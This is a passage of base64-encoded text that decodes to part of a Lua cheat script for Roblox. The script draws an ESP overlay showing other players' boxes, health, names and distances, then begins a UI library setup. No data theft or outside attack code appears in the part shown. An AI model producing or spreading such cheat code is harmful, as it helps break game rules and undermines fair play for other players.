G9tUmlnaHREb3duLlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvdHRvbURvd24uVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmlnaHRUb3AuVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkbyAtLSBCb3hlcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQm94LlBvc2l0aW9uID0gVURpbTIubmV3KDAsIFBvcy5YIC0gdyAvIDIsIDAsIFBvcy5ZIC0gaCAvIDIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3guU2l6ZSA9IFVEaW0yLm5ldygwLCB3LCAwLCBoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQm94LlZpc2libGUgPSBDb25maWcuRVNQLkRyYXdpbmcuQm94ZXMuRnVsbC5FbmFibGVkCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0gQW5pbWF0aW9uCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuRVNQLkRyYXdpbmcuQm94ZXMuQW5pbWF0ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUm90YXRpb25BbmdsZSA9IFJvdGF0aW9uQW5nbGUgKyAodGljaygpIC0gVGljaykgKiBDb25maWcuRVNQLkRyYXdpbmcuQm94ZXMuUm90YXRpb25TcGVlZCAqIG1hdGguY29zKG1hdGgucGkgLyA0ICogdGljaygpIC0gbWF0aC5waSAvIDIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JhZGllbnQxLlJvdGF0aW9uID0gUm90YXRpb25BbmdsZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyYWRpZW50Mi5Sb3RhdGlvbiA9IFJvdGF0aW9uQW5nbGUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGljayA9IHRpY2soKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIEhlYWx0aGJhcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkbyAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgaXNfaW5mID0gZmFsc2UKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgSHVtYW5vaWQuSGVhbHRoIH49IEh1bWFub2lkLkhlYWx0aCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhlYWx0aCA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlzX2luZiA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEhlYWx0aGJhci5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCBQb3MuWCAtIHcgLyAyIC0gNiwgMCwgUG9zLlkgLSBoIC8gMiArIGggKiAoMSAtIGhlYWx0aCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSGVhbHRoYmFyLlNpemUgPSBVRGltMi5uZXcoMCwgQ29uZmlnLkVTUC5EcmF3aW5nLkhlYWx0aGJhci5XaWR0aCwgMCwgaCAqIGhlYWx0aCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSGVhbHRoYmFyLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSBDb25maWcuRVNQLkRyYXdpbmcuSGVhbHRoYmFyLlRyYW5zcGFyZW5jeQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCZWhpbmRIZWFsdGhiYXIuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgUG9zLlggLSB3IC8gMiAtIDYsIDAsIFBvcy5ZIC0gaCAvIDIpIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJlaGluZEhlYWx0aGJhci5TaXplID0gVURpbTIubmV3KDAsIENvbmZpZy5FU1AuRHJhd2luZy5IZWFsdGhiYXIuV2lkdGgsIDAsIGgpIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJlaGluZEhlYWx0aGJhci5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gQ29uZmlnLkVTUC5EcmF3aW5nLkhlYWx0aGJhci5UcmFuc3BhcmVuY3kKCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEhlYWx0aGJhckdyYWRpZW50LkVuYWJsZWQgPSBDb25maWcuRVNQLkRyYXdpbmcuSGVhbHRoYmFyLkdyYWRpZW50CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSGVhbHRoYmFyR3JhZGllbnQuQ29sb3IgPSBDb2xvclNlcXVlbmNlLm5ld3sKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLCBDb25maWcuRVNQLkRyYXdpbmcuSGVhbHRoYmFyLkdyYWRpZW50UkdCMSksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMSwgQ29uZmlnLkVTUC5EcmF3aW5nLkhlYWx0aGJhci5HcmFkaWVudFJHQjIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBIZWFsdGhiYXJHcmFkaWVudC5PZmZzZXQgPSBWZWN0b3IyLm5ldygwLCBoZWFsdGggLSAxKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBjb2xvciA9IGdldEhlYWx0aENvbG9yKGhlYWx0aF9jbGFtcGVkICwgSHVtYW5vaWQuTWF4SGVhbHRoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGhlYWx0aHRleHR0ZXh0ID0gdG9zdHJpbmcobWF0aC5mbG9vcihoZWFsdGhfY2xhbXBlZCkpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGlzX2luZiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhlYWx0aHRleHR0ZXh0ID0gImluZiIKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbG9yID0gZ2V0SGVhbHRoQ29sb3IoSHVtYW5vaWQuTWF4SGVhbHRoLCBIdW1hbm9pZC5NYXhIZWFsdGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEhlYWx0aGJhci5CYWNrZ3JvdW5kQ29sb3IzID0gbm90IENvbmZpZy5FU1AuRHJhd2luZy5IZWFsdGhiYXIuR3JhZGllbnQgYW5kIGNvbG9yIG9yIENvbG9yMy5uZXcoMSwxLDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0gSGVhbHRoIFRleHQKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSGVhbHRoYmFyLlZpc2libGUgPSBDb25maWcuRVNQLkRyYXdpbmcuSGVhbHRoYmFyLkVuYWJsZWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCZWhpbmRIZWFsdGhiYXIuVmlzaWJsZSA9IENvbmZpZy5FU1AuRHJhd2luZy5IZWFsdGhiYXIuRW5hYmxlZAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuRVNQLkRyYXdpbmcuSGVhbHRoYmFyLkhlYWx0aFRleHQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgaGVhbHRoUGVyY2VudGFnZSA9IG1hdGguZmxvb3IoaGVhbHRoX2NsYW1wZWQgLyBIdW1hbm9pZC5NYXhIZWFsdGggKiAxMDApCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgaXNfaW5mIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZWFsdGhQZXJjZW50YWdlID0gMTAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBIZWFsdGhUZXh0LlBvc2l0aW9uID0gVURpbTIubmV3KDAsIFBvcy5YIC0gdyAvIDIgLSAxOCAtLVtbNl1dLCAwLCBQb3MuWSAtIGggLyAyICsgaCAqICgxIC0gaGVhbHRoUGVyY2VudGFnZSAvIDEwMCkgKyAzKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSGVhbHRoVGV4dC5UZXh0ID0gaGVhbHRodGV4dHRleHQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEhlYWx0aFRleHQuVGV4dFNpemUgPSBDb25maWcuRVNQLkZvbnRTaXplCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLUhlYWx0aFRleHQuRm9udCA9IENvbmZpZy5FU1AuRm9udAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSGVhbHRoVGV4dC5WaXNpYmxlID0gQ29uZmlnLkVTUC5EcmF3aW5nLkhlYWx0aGJhci5IZWFsdGhUZXh0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBIZWFsdGhUZXh0LlRleHRTdHJva2VUcmFuc3BhcmVuY3kgPSBDb25maWcuRVNQLkRyYXdpbmcuSGVhbHRoYmFyLkhlYWx0aFRleHRUcmFuc3BhcmVuY3kKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5FU1AuRHJhd2luZy5IZWFsdGhiYXIuTGVycCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSGVhbHRoVGV4dC5UZXh0Q29sb3IzID0gY29sb3IKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBIZWFsdGhUZXh0LlRleHRDb2xvcjMgPSBDb25maWcuRVNQLkRyYXdpbmcuSGVhbHRoYmFyLkhlYWx0aFRleHRSR0IKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBIZWFsdGhUZXh0LlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkbyAtLSBOYW1lcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUuVmlzaWJsZSA9IENvbmZpZy5FU1AuRHJhd2luZy5OYW1lcy5FbmFibGVkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTmFtZS5UZXh0ID0gcGxyLk5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuRVNQLk9wdGlvbnMuRnJpZW5kY2hlY2sgYW5kIGxwbGF5ZXI6SXNGcmllbmRzV2l0aChwbHIuVXNlcklkKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUuVGV4dCA9IHN0cmluZy5mb3JtYXQoJyg8Zm9udCBjb2xvcj0icmdiKCVkLCAlZCwgJWQpIj5GPC9mb250PikgJXMnLCBDb25maWcuRVNQLk9wdGlvbnMuRnJpZW5kY2hlY2tSR0IuUiAqIDI1NSwgQ29uZmlnLkVTUC5PcHRpb25zLkZyaWVuZGNoZWNrUkdCLkcgKiAyNTUsIENvbmZpZy5FU1AuT3B0aW9ucy5GcmllbmRjaGVja1JHQi5CICogMjU1LCBwbHIuTmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBOYW1lLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIFBvcy5YLCAwLCBQb3MuWSAtIGggLyAyIC0gOSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkbyAtLSBEaXN0YW5jZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5FU1AuRHJhd2luZy5EaXN0YW5jZXMuRW5hYmxlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdlYXBvbi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCBQb3MuWCwgMCwgUG9zLlkgKyBoIC8gMiArIDcpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLVdlYXBvbkljb24uUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgUG9zLlggLSAyMSwgMCwgUG9zLlkgKyBoIC8gMiArIDE1KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRGlzdGFuY2UuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgUG9zLlgsIDAsIFBvcy5ZICsgaCAvIDIgKyAoV2VhcG9uLlZpc2libGUgYW5kIDE4IG9yIDcpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEaXN0YW5jZS5UZXh0ID0gc3RyaW5nLmZvcm1hdCgiJWQgU3R1ZHMiLCBtYXRoLmZsb29yKERpc3QpKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRGlzdGFuY2UuVmlzaWJsZSA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLS1EaXN0YW5jZS5Gb250ID0gQ29uZmlnLkVTUC5Gb250CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXZWFwb24uUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgUG9zLlgsIDAsIFBvcy5ZICsgaCAvIDIgKyA4KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEaXN0YW5jZS5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG8gLS0gV2VhcG9ucwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdlYXBvbi5WaXNpYmxlID0gQ29uZmlnLkVTUC5EcmF3aW5nLldlYXBvbnMuRW5hYmxlZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tV2VhcG9uLkZvbnQgPSBDb25maWcuRVNQLkZvbnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBIaWRlRVNQKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSGlkZUVTUCgpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEhpZGVFU1AoKTsKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICBIaWRlRVNQKCk7CiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQpKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgY29yb3V0aW5lLndyYXAoVXBkYXRlcikoKTsKICAgICAgICAgICAgZW5kKSkKICAgICAgICBlbmQKICAgICAgICBkbyAtLSBVcGRhdGUgRVNQCiAgICAgICAgICAgIGZvciBfLCB2IGluIHBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgICAgICAgICAgaWYgdiB+PSBscGxheWVyIHRoZW4KICAgICAgICAgICAgICAgICAgICBjb3JvdXRpbmUud3JhcChFU1ApKHYpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIC0tCiAgICAgICAgICAgIFBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbih2KQogICAgICAgICAgICAgICAgY29yb3V0aW5lLndyYXAoRVNQKSh2KQogICAgICAgICAgICBlbmQpOwoKICAgICAgICAgICAgUGxheWVycy5QbGF5ZXJSZW1vdmluZzpDb25uZWN0KGZ1bmN0aW9uKHYpCiAgICAgICAgICAgICAgICBpZiBQbGF5ZXJzX0VTUFt2Lk5hbWVdIHRoZW4KICAgICAgICAgICAgICAgICAgICBQbGF5ZXJzX0VTUFt2Lk5hbWVdLlJlZnJlc2hFbGVtZW50cyA9IG5pbAogICAgICAgICAgICAgICAgICAgIFBsYXllcnNfRVNQW3YuTmFtZV0uQ2hhcmFjdGVyQWRkZWQ6RGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICAgICAgUGxheWVyc19FU1Bbdi5OYW1lXS5DaGFyYWN0ZXJBZGRlZCA9IG5pbAogICAgICAgICAgICAgICAgICAgIFBsYXllcnNfRVNQW3YuTmFtZV0uVG9vbENvbm5lY3Rpb25fQWRkZWQ6RGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICAgICAgUGxheWVyc19FU1Bbdi5OYW1lXS5Ub29sQ29ubmVjdGlvbl9SZW1vdmVkOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICAgICAgICAgIFBsYXllcnNfRVNQW3YuTmFtZV0uVG9vbENvbm5lY3Rpb25fUmVtb3ZlZCA9IG5pbAogICAgICAgICAgICAgICAgICAgIFBsYXllcnNfRVNQW3YuTmFtZV0uVG9vbENvbm5lY3Rpb25fQWRkZWQgPSBuaWwKICAgICAgICAgICAgICAgICAgICBQbGF5ZXJzX0VTUFt2Lk5hbWVdID0gbmlsCiAgICAgICAgICAgICAgICBlbmQgCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQ7CiAgICBlbmQ7CmVuZAoKaWYgbm90IE1vYmlsZSB0aGVuCi0tTFBIX0pJVF9NQVgoZnVuY3Rpb24oKQogICAgbG9jYWwgdWlzID0gU2VydmljZXMuVXNlcklucHV0U2VydmljZQogICAgbG9jYWwgcGxheWVycyA9IFNlcnZpY2VzLlBsYXllcnMKICAgIGxvY2FsIHdzID0gU2VydmljZXMuV29ya3NwYWNlCiAgICBsb2NhbCBycyA9IFNlcnZpY2VzLlJlcGxpY2F0ZWRTdG9yYWdlCiAgICBsb2NhbCBodHRwX3NlcnZpY2UgPSBTZXJ2aWNlcy5IdHRwU2VydmljZQogICAgbG9jYWwgZ3VpX3NlcnZpY2UgPSBTZXJ2aWNlcy5HdWlTZXJ2aWNlCiAgICBsb2NhbCBsaWdodGluZyA9IFNlcnZpY2VzLkxpZ2h0aW5nCiAgICBsb2NhbCBydW4gPSBTZXJ2aWNlcy5SdW5TZXJ2aWNlCiAgICBsb2NhbCBzdGF0cyA9IFNlcnZpY2VzLlN0YXRzCiAgICBsb2NhbCBjb3JlZ3VpID0gU2VydmljZXMuQ29yZUd1aQogICAgbG9jYWwgZGVicmlzID0gU2VydmljZXMuRGVicmlzCiAgICBsb2NhbCB0d2Vlbl9zZXJ2aWNlID0gU2VydmljZXMuVHdlZW5TZXJ2aWNlCiAgICBsb2NhbCBzb3VuZF9zZXJ2aWNlID0gU2VydmljZXMuU291bmRTZXJ2aWNlCiAgICBsb2NhbCBydW5fc2VydmljZSA9IFNlcnZpY2VzLlJ1blNlcnZpY2UKCgogICAgbG9jYWwgdmVjMiA9IFZlY3RvcjIubmV3CiAgICBsb2NhbCB2ZWMzID0gVmVjdG9yMy5uZXcKICAgIGxvY2FsIGRpbTIgPSBVRGltMi5uZXcKICAgIGxvY2FsIGRpbSA9IFVEaW0ubmV3IAogICAgbG9jYWwgcmVjdCA9IFJlY3QubmV3CiAgICBsb2NhbCBjZnIgPSBDRnJhbWUubmV3CiAgICBsb2NhbCBlbXB0eV9jZnIgPSBjZnIoKQogICAgbG9jYWwgcG9pbnRfb2JqZWN0X3NwYWNlID0gZW1wdHlfY2ZyLlBvaW50VG9PYmplY3RTcGFjZQogICAgbG9jYWwgYW5nbGUgPSBDRnJhbWUuQW5nbGVzCiAgICBsb2NhbCBkaW1fb2Zmc2V0ID0gVURpbTIuZnJvbU9mZnNldAoKICAgIGxvY2FsIGNvbG9yID0gQ29sb3IzLm5ldwogICAgbG9jYWwgcmdiID0gQ29sb3IzLmZyb21SR0IKICAgIGxvY2FsIGhleCA9IENvbG9yMy5mcm9tSGV4CiAgICBsb2NhbCBoc3YgPSBDb2xvcjMuZnJvbUhTVgogICAgbG9jYWwgcmdic2VxID0gQ29sb3JTZXF1ZW5jZS5uZXcKICAgIGxvY2FsIHJnYmtleSA9IENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcKICAgIGxvY2FsIG51bXNlcSA9IE51bWJlclNlcXVlbmNlLm5ldwogICAgbG9jYWwgbnVta2V5ID0gTnVtYmVyU2VxdWVuY2VLZXlwb2ludC5uZXcKCiAgICBsb2NhbCBjYW1lcmEgPSB3cy5DdXJyZW50Q2FtZXJhCiAgICBsb2NhbCBscCA9IHBsYXllcnMuTG9jYWxQbGF5ZXIgCiAgICBsb2NhbCBtb3VzZSA9IGxwOkdldE1vdXNlKCkgCiAgICBsb2NhbCBndWlfb2Zmc2V0ID0gZ3VpX3NlcnZpY2U6R2V0R3VpSW5zZXQoKS5ZCgogICAgbG9jYWwgbWF4ID0gbWF0aC5tYXggCiAgICBsb2NhbCBmbG9vciA9IG1hdGguZmxvb3IgCiAgICBsb2NhbCBtaW4gPSBtYXRoLm1pbiAKICAgIGxvY2FsIGFicyA9IG1hdGguYWJzIAogICAgbG9jYWwgbm9pc2UgPSBtYXRoLm5vaXNlCiAgICBsb2NhbCByYWQgPSBtYXRoLnJhZCAKICAgIGxvY2FsIHJhbmRvbSA9IG1hdGgucmFuZG9tIAogICAgbG9jYWwgcG93ID0gbWF0aC5wb3cgCiAgICBsb2NhbCBzaW4gPSBtYXRoLnNpbiAKICAgIGxvY2FsIHBpID0gbWF0aC5waSAKICAgIGxvY2FsIHRhbiA9IG1hdGgudGFuIAogICAgbG9jYWwgYXRhbjIgPSBtYXRoLmF0YW4yIAogICAgbG9jYWwgY2xhbXAgPSBtYXRoLmNsYW1wIAoKICAgIGxvY2FsIGluc2VydCA9IHRhYmxlLmluc2VydCAKICAgIGxvY2FsIGZpbmQgPSB0YWJsZS5maW5kIAogICAgbG9jYWwgcmVtb3ZlID0gdGFibGUucmVtb3ZlCiAgICBsb2NhbCBjb25jYXQgPSB0YWJsZS5jb25jYXQKLS0gCgotLSBMaWJyYXJ5IGluaXQKICAgIGxvY2FsIHRoZW1lcyA9IHsKICAgICAgICBwcmVzZXQgPSB7CiAgICAgICAgICAgIGFjY2VudCA9IHJnYigyNTUsMjU1LDI1NSksCiAgICAgICAgfSwgCgogICAgICAgIHV0aWxpdHkgPSB7CiAgICAgICAgICAgIGFjY2VudCA9IHsKICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSB7fSwgCQogICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHt9LCAKICAgICAgICAgICAgICAgIEltYWdlQ29sb3IzID0ge30sIAogICAgICAgICAgICAgICAgU2Nyb2xsQmFySW1hZ2VDb2xvcjMgPSB7fSAKICAgICAgICAgICAgfSwKICAgICAgICB9CiAgICB9CgogICAgbG9jYWwga2V5cyA9IHsKICAgICAgICBbRW51bS5LZXlDb2RlLkxlZnRTaGlmdF0gPSAiTFMiLAogICAgICAgIFtFbnVtLktleUNvZGUuUmlnaHRTaGlmdF0gPSAiUlMiLAogICAgICAgIFtFbnVtLktleUNvZGUuTGVmdENvbnRyb2xdID0gIkxDIiwKICAgICAgICBbRW51bS5LZXlDb2RlLlJpZ2h0Q29udHJvbF0gPSAiUkMiLAogICAgICAgIFtFbnVtLktleUNvZGUuSW5zZXJ0XSA9ICJJTlMiLAogICAgICAgIFtFbnVtLktleUNvZGUuQmFja3NwYWNlXSA9ICJCUyIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5SZXR1cm5dID0gIkVudCIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5MZWZ0QWx0XSA9ICJMQSIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5SaWdodEFsdF0gPSAiUkEiLAogICAgICAgIFtFbnVtLktleUNvZGUuQ2Fwc0xvY2tdID0gIkNBUFMiLAogICAgICAgIFtFbnVtLktleUNvZGUuT25lXSA9ICIxIiwKICAgICAgICBbRW51bS5LZXlDb2RlLlR3b10gPSAiMiIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5UaHJlZV0gPSAiMyIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5Gb3VyXSA9ICI0IiwKICAgICAgICBbRW51bS5LZXlDb2RlLkZpdmVdID0gIjUiLAogICAgICAgIFtFbnVtLktleUNvZGUuU2l4XSA9ICI2IiwKICAgICAgICBbRW51bS5LZXlDb2RlLlNldmVuXSA9ICI3IiwKICAgICAgICBbRW51bS5LZXlDb2RlLkVpZ2h0XSA9ICI4IiwKICAgICAgICBbRW51bS5LZXlDb2RlLk5pbmVdID0gIjkiLAogICAgICAgIFtFbnVtLktleUNvZGUuWmVyb10gPSAiMCIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5LZXlwYWRPbmVdID0gIk51bTEiLAogICAgICAgIFtFbnVtLktleUNvZGUuS2V5cGFkVHdvXSA9ICJOdW0yIiwKICAgICAgICBbRW51bS5LZXlDb2RlLktleXBhZFRocmVlXSA9ICJOdW0zIiwKICAgICAgICBbRW51bS5LZXlDb2RlLktleXBhZEZvdXJdID0gIk51bTQiLAogICAgICAgIFtFbnVtLktleUNvZGUuS2V5cGFkRml2ZV0gPSAiTnVtNSIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5LZXlwYWRTaXhdID0gIk51bTYiLAogICAgICAgIFtFbnVtLktleUNvZGUuS2V5cGFkU2V2ZW5dID0gIk51bTciLAogICAgICAgIFtFbnVtLktleUNvZGUuS2V5cGFkRWlnaHRdID0gIk51bTgiLAogICAgICAgIFtFbnVtLktleUNvZGUuS2V5cGFkTmluZV0gPSAiTnVtOSIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5LZXlwYWRaZXJvXSA9ICJOdW0wIiwKICAgICAgICBb